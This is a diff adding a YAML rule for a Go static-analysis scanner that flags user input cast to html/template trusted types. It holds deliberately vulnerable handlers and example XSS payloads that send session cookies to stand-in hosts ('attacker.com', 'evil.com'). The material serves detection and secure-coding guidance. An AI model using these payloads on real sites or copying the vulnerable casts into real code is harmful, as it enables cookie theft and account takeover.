@@ -1,0 +1,251 @@
+# Rule Identity
+id: GO-XSS-001
+name: XSS via Unsafe html/template Type Conversions
+short_description: |
+  User input cast to template.HTML, template.CSS, template.JS, or template.URL bypasses
+  Go's context-aware auto-escaping, allowing raw attacker payload to reach the browser.
+
+# Classification
+severity: HIGH
+category: security
+language: go
+ruleset: golang/GO-XSS-001
+
+# Vulnerability Details
+cwe:
+  - id: CWE-79
+    name: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - id: CWE-116
+    name: "Improper Encoding or Escaping of Output"
+    url: https://cwe.mitre.org/data/definitions/116.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - go
+  - security
+  - xss
+  - reflected-xss
+  - stored-xss
+  - template
+  - html-template
+  - context-aware-escaping
+  - CWE-79
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  Go's html/template package performs context-aware escaping by default — it tracks
+  whether a template action appears in an HTML body, attribute, <script> block,
+  <style> block, or URL context, and applies appropriate escaping automatically.
+  This is one of Go's strongest built-in security features.
+
+  The package defines "trusted type" wrappers that signal "skip escaping, this is
+  already safe": template.HTML, template.CSS, template.JS, template.JSStr,
+  template.HTMLAttr, template.URL, and template.Srcset. When a developer casts
+  user-controlled input to any of these types, the template engine outputs the value
+  verbatim without escaping — directly enabling XSS.
+
+  Go's standard library itself has had five CVEs in html/template between 2023–2026:
+  CVE-2023-24538 (backtick JS template literal injection, CVSS 9.8), CVE-2023-39318,
+  CVE-2023-39319 (script context comment handling), and CVE-2026-27142 (meta refresh
+  URL injection). Developers should not assume html/template is bulletproof — correct
+  usage (no type conversion of untrusted data) is still required.
+
+  Note: text/template performs zero HTML escaping. Using text/template where
+  html/template is needed is equivalent to writing raw user input into the response.
+
+message: |
+  User-controlled input is cast to a template trusted type (template.HTML, CSS, JS,
+  URL, or HTMLAttr), bypassing html/template's automatic XSS escaping. Remove the
+  explicit type conversion — html/template auto-escapes plain string values correctly.
+
+security_implications:
+  - title: Session Hijacking
+    description: |
+      Injected <script>document.location='https://attacker.com?c='+document.cookie</script>
+      steals the victim's session cookie, providing full account takeover.
+  - title: Credential Harvesting
+    description: |
+      DOM manipulation replaces login forms with attacker-controlled forms that
+      exfiltrate credentials directly to the attacker's server.
+  - title: Malware Distribution
+    description: |
+      Stored XSS can silently redirect visitors to drive-by-download pages or
+      inject crypto miners into every page load on a compromised site.
+  - title: CSRF Token Theft
+    description: |
+      Injected JS reads CSRF tokens from the DOM, enabling state-changing requests
+      as the authenticated victim. Real example: Gogs CVE-2022-32174 used stored XSS
+      to extract CSRF tokens and escalate victim accounts to admin.
+  - title: CSS Injection via template.CSS
+    description: |
+      template.CSS(userInput) can inject legacy IE expression() payloads or close
+      the style block and open a script block: </style><script>alert(1)</script>.
+  - title: javascript: URL via template.URL
+    description: |
+      template.URL only validates the scheme is not obviously dangerous but does not
+      block javascript: pseudo-protocol in all contexts. Attacker supplies
+      javascript:fetch('https://evil.com?c='+document.cookie) as a href value.
+
+vulnerable_example: |
+  // VULNERABLE: user input cast to template.HTML — escaping completely disabled
+  func profileHandler(w http.ResponseWriter, r *http.Request) {
+      bio := r.FormValue("bio")
+      data := struct{ Bio template.HTML }{Bio: template.HTML(bio)}
+      tmpl.Execute(w, data)
+      // Attacker sends: bio=<script>document.location='https://evil.com?c='+document.cookie</script>
+  }
+
+  // VULNERABLE: user-supplied URL cast to template.URL
+  func linkHandler(w http.ResponseWriter, r *http.Request) {
+      href := r.FormValue("href")
+      _ = template.URL(href) // javascript:steal() bypasses scheme check
+  }
+
+  // VULNERABLE: CSS injection via template.CSS
+  func themeHandler(w http.ResponseWriter, r *http.Request) {
+      color := r.FormValue("color")
+      _ = template.CSS(color) // </style><script>alert(1)</script> works
+  }
+
+secure_example: |
+  // SECURE: pass as plain string — html/template auto-escapes correctly
+  func profileHandler(w http.ResponseWriter, r *http.Request) {
+      bio := r.FormValue("bio")
+      data := struct{ Bio string }{Bio: bio}
+      tmpl.Execute(w, data) // auto-escaped in all contexts
+  }
+
+  // SECURE: allow-list validation before accepting a URL from user input
+  func linkHandler(w http.ResponseWriter, r *http.Request) {
+      href := r.FormValue("href")
+      // Only allow https:// URLs to known domains
+      parsed, err := url.Parse(href)
+      if err != nil || parsed.Scheme != "https" || !isAllowedHost(parsed.Host) {
+          href = "/default"
+      }
+      data := struct{ Href string }{Href: href}
+      tmpl.Execute(w, data)
+  }
+
+  // SECURE: for user-generated rich HTML, sanitize with a proper library
+  // then wrap in template.HTML (the sanitizer guarantees safety)
+  import "github.com/microcosm-cc/bluemonday"
+  p := bluemonday.UGCPolicy()
+  safeHTML := template.HTML(p.Sanitize(userHTML))
+  tmpl.Execute(w, safeHTML)
+
+  // SECURE: additional defense-in-depth — CSP header
+  w.Header().Set("Content-Security-Policy",
+      "default-src 'self'; script-src 'nonce-{RANDOM}'; object-src 'none';")
+
+recommendations:
+  - Never cast user-controlled values to template.HTML, template.CSS, template.JS,
+    template.URL, template.HTMLAttr, template.JSStr, or template.Srcset.
+  - Use html/template (not text/template) for all HTML output — text/template has
+    zero escaping and is only safe for non-HTML output like plaintext emails.
+  - For rich HTML content from users, use a dedicated HTML sanitizer
+    (e.g., github.com/microcosm-cc/bluemonday) before wrapping in template.HTML.
+  - Set a strict Content-Security-Policy header as defense-in-depth.
+  - Set HttpOnly and SameSite=Lax on session cookies to limit XSS blast radius.
+  - Keep Go up to date — html/template has had multiple CVEs; always run the latest
+    patch release.
+
+detection_scope: |
+  Tracks taint from net/http.Request, gin.Context, echo.Context, fiber.Ctx to
+  html/template type conversion calls (template.HTML, CSS, JS, JSStr, HTMLAttr,
+  Srcset, URL). Catches reflected XSS and partially catches stored XSS (when the
+  DB read is within the tracked scope). Does not detect DOM XSS.
+
+# Real-World CVEs
+cves:
+  - id: CVE-2023-24538
+    description: |
+      Backtick characters were not treated as JS string delimiters in html/template.
+      Template actions inside ES6 template literals injected arbitrary JavaScript.
+      CVSS 9.8 Critical. Fixed in Go 1.19.8 / 1.20.3.
+    url: https://github.com/golang/go/issues/59234
+  - id: CVE-2023-39318
+    description: |
+      HTML-like comment tokens (<!--) inside <script> context were mishandled,
+      causing the parser to misidentify the context and under-escape output.
+      Fixed in Go 1.21.1 / 1.20.8.
+    url: https://github.com/golang/go/issues/62196
+  - id: CVE-2023-39319
+    description: |
+      Occurrences of <script>, <!--, </script> within JS literals caused script
+      context to be considered terminated early. Fixed in Go 1.21.1 / 1.20.8.
+    url: https://github.com/golang/go/issues/62197
+  - id: CVE-2022-32174
+    description: |
+      Stored XSS in Gogs (Go Git service) via the Full Name field. Payload
+      extracted CSRF tokens and escalated victim accounts to admin.
+      Affected Gogs v0.6.5 through v0.12.10.
+    url: https://nvd.nist.gov/vuln/detail/CVE-2022-32174
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A03:2021 - Injection (XSS sub-category)"
+  - standard: CWE Top 25 (2024)
+    requirement: "CWE-79 - Cross-site Scripting (rank #2)"
+  - standard: PCI DSS v4.0
+    requirement: |
+      Requirement 6.2.4 — Protect bespoke and custom software against attacks
+      including cross-site scripting. Requirement 6.4.3 — all scripts on payment
+      pages must be inventoried and integrity-checked.
+  - standard: NIST SP 800-53 Rev 5
+    requirement: "SI-10 (Information Input Validation) and SI-15 (Information Output Filtering)"
+  - standard: HIPAA Security Rule
+    requirement: "§164.312(a)(2)(iv) — Encryption and decryption of ePHI during transmission"
+
+# References
+references:
+  - title: "Go html/template package — trusted type documentation"
+    url: https://pkg.go.dev/html/template
+  - title: "Go html/template source — context-aware escaping design"
+    url: https://go.dev/src/html/template/doc.go
+  - title: "google/safehtml — escaping escape hatches from html/template"
+    url: https://pkg.go.dev/github.com/google/safehtml/template
+  - title: "OWASP XSS Prevention Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - title: "OWASP Types of Cross-Site Scripting"
+    url: https://owasp.org/www-community/Types_of_Cross-Site_Scripting
+  - title: "CWE-79: Cross-site Scripting"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - title: "CWE-79: Improper Neutralization of Input During Web Page Generation — MITRE"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - title: "Rob's Go Security Pearls: XSS (independent blog)"
+    url: https://blogtitle.github.io/robn-go-security-pearls-cross-site-scripting-xss/
+  - title: "Calhoun.io: Contextual Encoding in html/template"
+    url: https://www.calhoun.io/intro-to-templates-p1-contextual-encoding/
+  - title: "CVE-2023-24538 — backtick JS template literal injection"
+    url: https://github.com/golang/go/issues/59234
+  - title: "CVE-2022-32174 NVD — Gogs stored XSS"
+    url: https://nvd.nist.gov/vuln/detail/CVE-2022-32174
+  - title: "CodeQL XSS query help for Go"
+    url: https://codeql.github.com/codeql-query-help/go/go-html-template-escaping-bypass-xss/
+  - title: "MDN: Cross-site scripting (XSS)"
+    url: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
+  - title: "OWASP HTTP Headers Cheat Sheet — CSP"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
+
+# Similar Rules
+similar_rules:
+  - GO-XSS-002
+  - GO-XSS-003
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
